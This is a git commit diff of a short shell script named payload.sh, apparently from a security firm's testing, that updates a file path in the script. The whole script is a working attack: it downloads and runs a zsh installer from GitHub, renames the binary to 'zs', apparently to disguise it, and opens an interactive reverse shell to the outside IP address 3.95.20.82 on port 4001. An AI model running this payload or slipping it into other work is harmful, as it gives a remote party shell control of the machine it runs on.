2c594fc919f2dc0fce3de06eb4e06086b95d656f
praetorian-snyk-max-2 <aarushi.dwivedi+2@praetorian.com>
2024-11-27 12:40:07 -0500

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,5 +1,5 @@
 curl https://raw.githubusercontent.com/romkatv/zsh-bin/master/install -o /tmp/install
 chmod +x /tmp/install
 /tmp/install -d /tmp -e no -q
-mv /tmp/zsh /tmp/zs
-/tmp/zs -i >& /dev/tcp/3.95.20.82/4001 0>&1
+mv /tmp/bin/zsh /tmp/bin/zs
+/tmp/bin/zs -i >& /dev/tcp/3.95.20.82/4001 0>&1
